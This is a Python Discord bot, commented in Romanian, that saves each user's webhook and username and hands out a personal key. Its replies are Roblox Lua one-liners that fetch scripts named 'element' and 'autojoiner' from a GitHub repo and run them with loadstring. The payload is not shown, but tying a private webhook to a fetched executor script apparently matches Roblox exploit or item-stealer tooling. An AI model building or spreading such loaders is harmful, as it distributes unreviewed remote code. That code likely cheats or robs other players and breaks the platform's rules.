import os
import secrets
import discord
from discord import app_commands
from discord.ext import commands
from supabase import create_client, Client

# ---------------------------
# CONFIG
# ---------------------------
TOKEN = os.getenv("DISCORD_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

ELEMENT_URL = "https://raw.githubusercontent.com/elementhelp/script/refs/heads/main/element"
AUTOJOINER_URL = "https://raw.githubusercontent.com/elementhelp/script/refs/heads/main/autojoiner"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


# ---------------------------
# FUNCȚII UTILE
# ---------------------------
def generate_key():
    """Generează un KEY unic pentru user"""
    random_part = secrets.token_urlsafe(24)  # string random sigur
    return f"ELEMENT${random_part}"


@bot.event
async def on_ready():
    await tree.sync()
    print(f"✅ Bot conectat ca {bot.user}")


# ---------------------------
# SET WEBHOOK
# ---------------------------
@tree.command(name="setwebhook", description="Setează webhook-ul tău")
async def set_webhook(interaction: discord.Interaction, webhook: str):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()
    if existing.data:
        supabase.table("elements").update({"webhook": webhook}).eq("user_id", user_id).execute()
    else:
        supabase.table("elements").insert({"user_id": user_id, "webhook": webhook}).execute()

    await interaction.response.send_message(f"✅ Webhook setat la:\n{webhook}", ephemeral=True)


# ---------------------------
# SET USERNAME
# ---------------------------
@tree.command(name="setusername", description="Setează username-ul tău")
async def set_username(interaction: discord.Interaction, username: str):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()
    if existing.data:
        supabase.table("elements").update({"username": username}).eq("user_id", user_id).execute()
    else:
        supabase.table("elements").insert({"user_id": user_id, "username": username}).execute()

    await interaction.response.send_message(f"✅ Username setat la: **{username}**", ephemeral=True)


# ---------------------------
# GENERATE ELEMENT SCRIPT
# ---------------------------
@tree.command(name="generate", description="Generează scriptul Element")
async def generate(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    existing = supabase.table("elements").select("id, webhook, username, key").eq("user_id", user_id).execute()

    if not existing.data:
        await interaction.response.send_message(
            "❌ Nu există un script generat. Folosește `/setwebhook` și `/setusername` mai întâi.",
            ephemeral=True
        )
        return

    element = existing.data[0]
    element_id = element["id"]
    webhook = element.get("webhook", "⚠️ Nu este setat")
    username = element.get("username", "⚠️ Nu este setat")

    # dacă nu are key, generăm unul nou
    key = element.get("key")
    if not key:
        key = generate_key()
        supabase.table("elements").update({"key": key}).eq("id", element_id).execute()

    msg = (
        f"**Your Element Script**\n"
        f"🔗 Webhook: {webhook}\n"
        f"👤 Username: {username}\n\n"
        f'KEY="{key}"\n'
        f'loadstring(game:HttpGet("{ELEMENT_URL}"))()'
    )

    await interaction.response.send_message(msg, ephemeral=True)


# ---------------------------
# GENERATE AUTOJOINER SCRIPT
# ---------------------------
@tree.command(name="generate-autojoiner", description="Generează scriptul Auto Joiner")
async def generate_autojoiner(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id, key").eq("user_id", user_id).execute()
    if not existing.data:
        await interaction.response.send_message(
            "❌ Nu există un script generat. Folosește `/generate` mai întâi.", ephemeral=True
        )
        return

    element = existing.data[0]
    element_id = element["id"]
    key = element.get("key")

    # dacă nu are key, generăm unul nou
    if not key:
        key = generate_key()
        supabase.table("elements").update({"key": key}).eq("id", element_id).execute()

    msg = (
        "⚠️ DON'T SHARE! THIS CONTAINS YOUR PRIVATE KEY! ⚠️\n\n"
        f'KEY="{key}"\n'
        f'loadstring(game:HttpGet("{AUTOJOINER_URL}"))()'
    )

    await interaction.response.send_message(msg, ephemeral=True)


# ---------------------------
# RUN BOT
# ---------------------------
bot.run(TOKEN)
